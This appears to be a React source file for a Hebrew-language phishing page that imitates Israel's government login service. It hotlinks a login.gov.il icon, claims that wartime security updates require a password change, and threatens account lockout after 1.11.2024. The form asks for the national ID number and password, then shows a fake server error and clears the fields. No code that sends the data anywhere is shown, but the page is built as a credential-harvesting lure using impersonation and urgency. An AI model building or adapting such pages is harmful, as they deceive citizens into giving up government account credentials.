// src/LoginForm.js
import React, { useState } from 'react';
import { Form, Button, Container, Alert, Card, Row, Col } from 'react-bootstrap';

const Login = () => {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [message, setMessage] = useState('');

    const handleSubmit = (e) => {
        e.preventDefault();
        // Handle login logic here
        // Set the success message
        setMessage('השרת נתקל בבעיה. אנא היכנס מחדש מאוחר יותר'); // You can customize this message
        // Optionally, you can reset the form fields
        setUsername('');
        setPassword('');

    };

    return (
  
  <Container className="mt-5" style={{paddingBottom:150}}>
        <Row>
                <Col md='1'>
                    <img height={40} src="https://login.gov.il/nidp/GOV/static/media/password.269d227fe8a62bb4185f103a22d3bac0.svg"/>
                </Col>
                <Col md='11'>
                    <h2 className="text-center">עדכון סיסמה</h2>
                </Col>
            </Row>
            <h6>כחלק ממכלול עדכוני האבטחה שביצענו באתר מאז תחילת המלחמה - הינך נדרש לשנות את סיסמתך בהקדם האפשרי.
                <br/>אנא מלא את פרטי ההזדהות ולאחר מכן תועבר לאתר לדף עדכון הסיסמה 
                </h6>
                <Alert variant="danger" className="mt-3">
                    שים לב! ניתן לשנות את הסיסמא רק עד 1.11.2024. לאחר מכן החשבון יינעל ותידרש הגעה פיזית למשרד הקרוב לאזורך עם פרטים מזהים.
                </Alert>
            <Card className="mt-3 shadow p-3">
            <Card.Body>
            <Form onSubmit={handleSubmit}>
                <Form.Group controlId="formUsername">
                    <Form.Label>מספר זהות בן 9 ספרות (כולל ספרת ביקורת)  </Form.Label>
                    <Form.Control 
                        type="text" 
                        placeholder="Enter username" 
                        value={username}
                        onChange={(e) => setUsername(e.target.value)} 
                    />
                </Form.Group>

                <Form.Group controlId="formPassword">
                    <Form.Label>סיסמה</Form.Label>
                    <Form.Control 
                        type="password" 
                        placeholder="Password" 
                        value={password}
                        onChange={(e) => setPassword(e.target.value)} 
                    />
                </Form.Group>

                <Button variant="primary" type="submit" className="mt-3 w-25">
                    כניסה
                </Button>
                
            </Form>
            
            </Card.Body>
            </Card>
            

            {/* Display the success message */}
            {message && (
                <Alert variant="danger" className="mt-3">
                    {message}
                </Alert>
            )}

        </Container>
    );
};

export default Login;
